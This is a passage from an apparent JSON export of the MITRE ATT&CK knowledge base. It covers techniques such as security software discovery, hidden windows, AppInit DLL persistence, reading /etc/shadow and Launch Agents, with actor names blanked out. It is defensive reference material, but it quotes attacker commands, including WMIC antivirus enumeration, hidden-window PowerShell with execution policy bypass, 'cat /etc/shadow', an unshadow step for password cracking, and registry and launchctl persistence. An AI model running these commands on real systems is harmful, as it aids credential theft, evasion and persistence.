      "can recognize the presence of monitoring tools on a target system.",
      "can identify if ESET or BitDefender antivirus are installed before dropping its payload.",
      "can check for antivirus and antimalware programs.",
      "can be used to enumerate security software currently running on a system by process name of known products.",
      "has queried the infected system's registry searching for specific registry keys associated with antivirus products.",
      "can detect EDR userland hooks.",
      "has attempted to discover third party endpoint detection and response (EDR) tools on compromised systems.",
      "has checked for the existence of Kaspersky antivirus software on the system.",
      "checks for processes associated with anti-virus vendors.",
      "has checked for the presence of antivirus software with powershell Get-CimInstance -Namespace root/securityCenter2  classname antivirusproduct.",
      "can check for the presence of specific security products.",
      "has searched for security products on infected machines.",
      "can list security software such as by using WMIC to identify anti-virus products installed on the victims machine and to obtain firewall details.",
      "collects the installed antivirus on the victim machine.",
      "has the ability to identify any anti-virus installed on the infected system.",
      "A module in  collects information from the victim about installed anti-virus software.",
      "enumerates running processes to search for Wireshark and Windows Sysinternals suite.",
      "can find the presence of a specific security software.",
      "enumerates the currently running processes related to a variety of security products.",
      "can list installed security products in the victims environment.",
      "checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.",
      "checks for the existence of anti-virus.",
      "has obtained information on security software including security logging information that may indicate whether their malware has been detected.",
      "checks for the presence of Bitdefender security software.",
      "can determine is Kaspersky software is running on an endpoint by running `cmd /c wmic process where name=avp.exe`.",
      "looks for various security products by process name using hard-coded values in the malware.  will not execute its keylogging thread if a process name associated with Trend Micro anti-virus is identified or if runtime checks identify the presence of Kaspersky anti-virus.  will initiate a new thread if certain security products are identified on the victim and recreate any malicious files associated with it if it determines they were removed by security software in a new system location.",
      "can search for processes associated with an anti-virus product from list.",
      "searches firewall configuration files located in /Library/Preferences/ and uses csrutil status to determine if System Integrity Protection is enabled.",
      "can obtain information on installed anti-malware programs.",
      "can enumerate antivirus software on the target.",
      "has checked for the presence of Little Snitch macOS network monitoring and application firewall software stopping and exiting if it is found.",
      "has the ability to check for the presence of Kaspersky security software.",
      "uses WMI to enumerate installed security products in the victims environment.",
      "can search for a variety of security software programs EDR systems and malware analysis tools.",
      "can search for anti-virus software running on the system.",
      "can search for anti-virus products on the system.",
      "checked for a variety of antivirus/endpoint detection agents prior to execution.",
      "uses the kill_unwanted function to get a list of running processes compares each process with an encrypted list of unwanted security related programs and kills the processes for security related programs.",
      "searches for anti-malware services running on the victims machine and terminates itself if it finds them.",
      "can obtain information about security software on the victim.",
      "can search for anti-virus products on the system.",
      "probes the system to check for antimalware processes.",
      "can check for the presence of network sniffers AV and BitDefender firewall.",
      "checks for anti-malware products and processes.",
      "has the ability to scan for security tools such as firewalls and antivirus tools.",
      "has the ability to collect information about installed AV products from an infected host.",
      "has the ability to search for Kaspersky Antivirus on a victim's machine.",
      "can identify AV products on an infected host using the following command: `cmd.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`.",
      "has been observed querying installed antivirus software.",
      "can check for the presence of 29 different antivirus tools.",
      "has a plugin detect security products via active drivers.",
      "can enumerate AWS security services including WAF rules and GuardDuty detectors.",
      "can identify the processes for Bkav antivirus.",
      "can use WMI commands to check the system for firewall and antivirus software.",
      "can be used to discover system firewall settings.",
      "can determine if an anti-virus product is installed through the resolution of the service's virtual SID.",
      "can check for the presence of ESET and Kaspersky security software.",
      "can identify installed AV software.",
      "used scripts which detected and uninstalled antivirus software.",
      "attempts to identify security software running on the victim machine such as BitDefender Avast and Kaspersky.",
      "can identify security software.",
      "can identify AV products on an infected host using the following command:` WMIC.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List`.",
      "has the ability to identify installed antivirus products.",
      "is capable of checking whether a compromised device is running DeepFreeze by Faronics.",
      "has used the information-stealing tool Grixba to scan for anti-virus software.",
      "involved removal of security tools as well as other identified IOT malware from compromised devices.",
      "has run shell commands to obtain a list of installed security products.",
      "has used Windows Management Instrumentation (WMI) to check for anti-virus products.",
      "has detected antivirus processes using commands such as tasklist and findstr.",
      "checks for the presence of various security software products during execution.",
      "enumerated installed security products during operations.",
      "looks for security software products prior to full execution."
    ],
    "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), reg query with [Reg](https://attack.mitre.org/software/S0075), dir with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.Adversaries may also utilize the [Cloud API](https://attack.mitre.org/techniques/T1059/009) to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
    "similar_words": [
      "Security Software Discovery"
    ],
    "id": "T1518.001"
  },
  "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0": {
    "name": "Hidden Window",
    "example_uses": [
      "loads its module with the XSL script parameter vShow set to zero which opens the application with a hidden window.",
      "has the ability to execute payloads in a hidden window.",
      "has the ability to hide the console window for its document search module from the user.",
      "can hide the current window from the targeted user via the `ShowWindow` API function.",
      "has been known to use -WindowStyle Hidden to conceal  windows.",
      "has used the WindowStyle parameter to conceal  windows.",
      "used -W Hidden to conceal  windows by setting the WindowStyle parameter to hidden.",
      "has used the command Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden to hide its window.",
      "has used -WindowStyle hidden to conceal  windows.",
      "has the ability to set its window state to hidden.",
      "can hide process windows and make web requests invisible to the compromised user. Requests marked as invisible have been sent with user-agent string `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML like Gecko) Version/7.0.3 Safari/7046A194A` though  can only be run on Windows systems.",
      "uses -w Hidden to conceal a  window that downloads a payload.",
      "can hide windows using `ProcessWindowStyle.Hidden`.",
      "can modify processes to prevent them from being visible on the desktop.",
      "has used -WindowsStyle Hidden to hide the command window.",
      "uses -windowstyle hidden to conceal a  window that downloads a payload.",
      "has used -w hidden to conceal  windows by setting the WindowStyle parameter to hidden.",
      "has used ProcessWindowStyle.Hidden to hide windows.",
      "can hide the execution of scheduled tasks using `ProcessWindowStyle.Hidden`.",
      "has the ability to conceal its activity through hiding active windows.",
      "has used -W Hidden to conceal  windows by setting the WindowStyle parameter to hidden.",
      "has used -w hidden and -windowstyle hidden to conceal  windows.",
      "can execute processes in a hidden window.",
      "used a payload that creates a hidden window.",
      "has used hidcon to run batch files in a hidden console window.",
      "has used -WindowStyle Hidden to conceal  windows.",
      "WarzoneRAT has the ability of performing remote desktop access via a hVNC window for decreased visibility.",
      "has hidden its console window by using the `ShowWindow` API function.",
      "has hidden malicious scripts using `powershell.exe -windowstyle hidden`.",
      "can hide its console window upon execution to decrease its visibility to a victim.",
      "executed PowerShell in a hidden window.",
      "has executed legitimate tools in hidden windows.",
      "has used an information gathering module that will hide an AV software window from the victim.",
      "has used the WindowStyle parameter to conceal  windows.",
      "has added a registry key so future powershell.exe instances are spawned with coordinates for a window position off-screen by default.",
      "malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window.",
      "TrickBot has used a hidden VNC (hVNC) window to monitor the victim and collect information stealthily.",
      "can execute PowerShell scripts in a hidden window.",
      "can instruct the OS to execute an application without a dock icon or menu.",
      "has hidden its GUI using the ShowWindow() WINAPI call.",
      "has executed hidden PowerShell windows.",
      "has the ability to hide the window for operations performed on a given file.",
      "droppers have used COM properties to execute malware in hidden windows.",
      "hides the Windows Console window created by its execution by directly importing the `kernel32.dll` and `user32.dll` libraries `GetConsoleWindow` and `ShowWindow` APIs.",
      "can execute command line arguments in a hidden window.",
      "can hide its console window upon execution through the `ShowWindow` API.",
      "has utilized the .NET `ProcessStartInfo` class features to prevent the process from creating a visible window through setting the `CreateNoWindow` setting to True which allows the executed command or script to run without displaying a command prompt window."
    ],
    "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.Similarly, on Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden.(Citation: PowerShell About 2019)The Windows Registry can also be edited to hide application windows from the current user. For example, by setting the `WindowPosition` subkey in the `HKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe` Registry key to a maximum value, PowerShell windows will open off screen and be hidden.(Citation: Cantoris Computing)In addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding explorer.exe process.(Citation: Hidden VNC)(Citation: Anatomy of an hVNC Attack)  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be invisible to other desktops windows.",
    "similar_words": [
      "Hidden Window"
    ],
    "id": "T1564.003"
  },
  "attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1": {
    "name": "Python",
    "example_uses": [
      "can use IronPython scripts to load payloads with the help of a .NET injector.",
      "is a Python-based backdoor compiled with PyInstaller.",
      "has used python scripts.",
      "has used Python scripts to execute payloads.",
      "has made use of Python-based remote access tools.",
      "can generate shellcode outputs that execute via Python.",
      "uses Python scripts.",
      "has used Python-based tools for execution.",
      "along with its functions is written in Python.",
      "has used Python-based implants to interact with compromised hosts.",
      "has used Python scripts to deploy ransomware.",
      "uses Python scripts for installing files and performing execution.",
      "has used Python-based malware to install and spread their coinminer.",
      "used multiple compiled Python scripts on the victims system. 's main backdoor  is also written in Python.",
      "uses Python scripts.",
      "has used Python scripts to execute payloads.",
      "used Python scripts for port scanning or building reverse shells.",
      "can use Python scripts to execute commands.",
      "is written in Python and can use multiple Python scripts for execution on targeted systems.",
      "has used Python scripts for execution and the installation of additional files.",
      "has developed tools in Python including .",
      "During  threat actors' backdoors were written in Python and compiled with py2exe.",
      "uses a python-based payload.",
      "has used a customized version of the  wmiexec.py module to create renamed output files.",
      "During  threat actors used a Python reverse shell and the PySoxy SOCKS5 proxy tool.",
      "has the ability to use Python to spawn a Unix shell.",
      "has used IronPython scripts as part of the  toolchain to drop payloads.",
      "has developed malware variants written in Python.",
      "executes a Python script to download its second stage.",
      "can use an add on feature when creating payloads that allows you to create custom Python scripts (scriptlets) to perform tasks offline (without requiring a session) such as sandbox detection adding persistence etc.",
      "has used Python to implement its DGA.",
      "has used a command line utility and a network scanner written in python.",
      "can support commands to execute Python-based payloads.",
      "is written in Python and is used in conjunction with additional Python scripts.",
      "is a Python web shell that can embed in the Ivanti Connect Secure CAV Python package.",
      "was executed with a Python script and worked in conjunction with additional Python-based post-exploitation tools.",
      "can use Python to perform execution.",
      "has used python scripts on the users system as well as the Python variant of the  agent EmPyre.",
      "uses Python for scripting to execute additional commands.",
      "has used various types of scripting to perform operations including Python scripts. The group was observed installing Python 2.7 on a victim.",
      "has used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data.",
      "has used a Python script to establish outbound communication and to execute commands using SMB port 445.",
      "is a Python-based web shell.",
      "During  threat actors used the Python `pty` module to open reverse shells.",
      "is a Python-based application.",
      "has used malicious Python scripts to execute payloads."
    ],
    "description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
    "similar_words": [
      "Python"
    ],
    "id": "T1059.006"
  },
  "attack-pattern--cc723aff-ec88-40e3-a224-5af9fd983cc4": {
    "name": "Identify Roles",
    "example_uses": [
      "has gathered detailed knowledge of team structures within a target organization.",
      "During   targeted specific individuals within an organization with tailored job vacancy announcements.",
      "has identified executives HR and IT staff at victim organizations for further targeting.",
      "has identified key network and IT staff members pre-compromise at targeted organizations."
    ],
    "description": "Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",
    "similar_words": [
      "Identify Roles"
    ],
    "id": "T1591.004"
  },
  "attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd": {
    "name": "AppInit DLLs",
    "example_uses": [
      "has used malware to set LoadAppInit_DLLs in the Registry key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows in order to establish persistence.",
      "If a victim meets certain criteria  uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL ResN32.dll. It does this by creating the following Registry keys: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs  %APPDATA%\\Intel\\ResN32.dll and HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs  0x1.",
      "Some variants of  use AppInit_DLLs to achieve persistence by creating the following Registry key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows AppInit_DLLs=pserver32.dll",
      "can insert itself into the address space of other applications using the AppInit DLL Registry key."
    ],
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",
    "similar_words": [
      "AppInit DLLs"
    ],
    "id": "T1546.010"
  },
  "attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a": {
    "name": "Phishing for Information",
    "example_uses": [
      "has used a combination of credential phishing and social engineering to capture one-time-password (OTP) codes.",
      "targeted presidential campaign staffers with credential phishing e-mails.",
      "has used spearphishing to compromise credentials.",
      "has used tailored spearphishing emails to gather victim information including contat lists to identify additional targets.",
      "has interacted with victims to gather information via email."
    ],
    "description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1672)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) Phishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)",
    "similar_words": [
      "Phishing for Information"
    ],
    "id": "T1598"
  },
  "attack-pattern--cdfc5f0a-9bb9-4352-b896-553cfa2d8fd8": {
    "name": "Establish Accounts",
    "example_uses": [
      "has created KeyBase accounts to communicate with ransomware victims.",
      "has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate  has created biographical sections and posted in forum threads.",
      "has created accounts on dark web forums to obtain various tools and malware.",
      "has leveraged stolen PII to create accounts."
    ],
    "description": "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for malicious purposes.(Citation: Free Trial PurpleUrchin)",
    "similar_words": [
      "Establish Accounts"
    ],
    "id": "T1585"
  },
  "attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1": {
    "name": "Obtain Capabilities",
    "example_uses": [],
    "description": "Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)",
    "similar_words": [
      "Obtain Capabilities"
    ],
    "id": "T1588"
  },
  "attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf": {
    "name": "Screensaver",
    "example_uses": [
      "can establish persistence through the system screensaver by configuring it to execute the malware."
    ],
    "description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in C:\\Windows\\System32\\, and C:\\Windows\\sysWOW64\\  on 64-bit Windows systems, along with screensavers included with base Windows installations.The following screensaver settings are stored in the Registry (HKCU\\Control Panel\\Desktop\\) and could be manipulated to achieve persistence:* SCRNSAVE.exe - set to malicious PE path* ScreenSaveActive - set to '1' to enable the screensaver* ScreenSaverIsSecure - set to '0' to not require a password to unlock* ScreenSaveTimeout - sets user inactivity timeout before screensaver is executedAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)",
    "similar_words": [
      "Screensaver"
    ],
    "id": "T1546.002"
  },
  "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae": {
    "name": "Conditional Access Policies",
    "example_uses": [
      "has added additional trusted locations to Azure AD conditional access policies."
    ],
    "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.For example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. By modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
    "similar_words": [
      "Conditional Access Policies"
    ],
    "id": "T1556.009"
  },
  "attack-pattern--cf1c2504-433f-4c4e-a1f8-91de45a0318c": {
    "name": "Create Cloud Instance",
    "example_uses": [
      "During   used access to the victim's Azure tenant to create Azure VMs.",
      "has created new virtual machines within the target's cloud environment after leveraging credential access to cloud assets.",
      "During   used access to the victim's Azure tenant to create Azure VMs. has also created Amazon EC2 instances within the victim's environment."
    ],
    "description": "An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",
    "similar_words": [
      "Create Cloud Instance"
    ],
    "id": "T1578.002"
  },
  "attack-pattern--cfb525cc-5494-401d-a82b-2539ca46a561": {
    "name": "Cloud Secrets Management Stores",
    "example_uses": [
      "can retrieve secrets from the AWS Secrets Manager via the enum_secrets module.",
      "has moved laterally from on-premises environments to steal passwords from Azure key vaults."
    ],
    "description": "Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  Secrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  If an adversary is able to gain sufficient privileges in a cloud environment  for example, by obtaining the credentials of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004) or compromising a service that has permission to retrieve secrets  they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation: Google Cloud Secrets)(Citation: Microsoft Azure Key Vault)**Note:** this technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",
    "similar_words": [
      "Cloud Secrets Management Stores"
    ],
    "id": "T1555.006"
  },
  "attack-pattern--cff94884-3b1c-4987-a70b-6d5643c621c3": {
    "name": "Code Repositories",
    "example_uses": [
      "has searched a victim's network for code repositories like GitLab and GitHub to discover further high-privilege account credentials.",
      "enumerates data stored within victim code repositories such as internal GitHub repositories.",
      "During the   downloaded source code from code repositories.",
      "cloned victim user Git repositories during intrusions."
    ],
    "description": "Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or [Unsecured Credentials](https://attack.mitre.org/techniques/T1552) contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.",
    "similar_words": [
      "Code Repositories"
    ],
    "id": "T1213.003"
  },
  "attack-pattern--d0613359-5781-4fd2-b5be-c269270be1f6": {
    "name": "Transmitted Data Manipulation",
    "example_uses": [
      "can monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary.",
      "has used DYEPACK to manipulate SWIFT messages en route to a printer.",
      "is capable of modifying email content headers and attachments during transit.",
      "has a function that can watch the contents of the system clipboard for valid bitcoin addresses which it then overwrites with the attacker's address."
    ],
    "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "similar_words": [
      "Transmitted Data Manipulation"
    ],
    "id": "T1565.002"
  },
  "attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4": {
    "name": "/etc/passwd and /etc/shadow",
    "example_uses": [
      "can obtain credential information from /etc/shadow using the shadow.py module.",
      "During  threat actors used `cat /etc/shadow` to steal password hashes."
    ],
    "description": "Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking. Most modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information, including password hashes in /etc/shadow. By default, /etc/shadow is only readable by the root user.(Citation: Linux Password and Shadow File Formats)Linux stores user information such as user ID, group ID, home directory path, and login shell in /etc/passwd. A \"user\" on the system may belong to a person or a service. All password hashes are stored in /etc/shadow - including entries for users with no passwords and users with locked or disabled accounts.(Citation: Linux Password and Shadow File Formats)Adversaries may attempt to read or dump the /etc/passwd and /etc/shadow files on Linux systems via command line utilities such as the cat command.(Citation: Arctic Wolf) Additionally, the Linux utility unshadow can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper - for example, via the command /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db(Citation: nixCraft - John the Ripper). Since the user information stored in /etc/passwd are linked to the password hashes in /etc/shadow, an adversary would need to have access to both.",
    "similar_words": [
      "/etc/passwd and /etc/shadow"
    ],
    "id": "T1003.008"
  },
  "attack-pattern--d10cbd34-42e3-45c0-84d2-535a09849584": {
    "name": "Launch Agent",
    "example_uses": [
      "adds a .plist file to the /Library/LaunchAgents folder to maintain persistence.",
      "persists via Launch Agent.",
      "persists via a Launch Agent.",
      "creates a Launch Agent on macOS.",
      "installs two LaunchAgents to redirect all network traffic with a randomly generated name for each plist file maintaining the format com.random.name.plist.",
      "can establish persistence via a LaunchAgent.",
      "installs a `com.apple.softwareupdate.plist` file in the `/LaunchAgents` folder with the `RunAtLoad` value set to `true`. Upon user login  is executed from `/var/root/.local/softwareupdate` with root privileges. Some variations also include the `LimitLoadToSessionType` key with the value `Aqua` ensuring the  only runs when there is a logged in GUI user.",
      "can create a persistence file in the folder /Library/LaunchAgents.",
      "can persist via a LaunchAgent.",
      "installs a launch item using an embedded encrypted launch agent property list template. The plist file is installed in the ~/Library/LaunchAgents/ folder and configured with the path to the persistent binary located in the ~/Library/ folder.",
      "has placed a  with a `plist` extension in the 's folder.",
      "creates user launch agents named .espl.plist and com.apple.[random string].plist to establish persistence.",
      "can create a  with the `RunAtLoad` key-value pair set to true ensuring the `com.apple.GrowlHelper.plist` file runs every time a user logs in.",
      "has installed multiple new Launch Agents in order to maintain persistence for cryptocurrency mining software.",
      "persists via a Launch Agent.",
      "The  trojan creates a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist with launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist.",
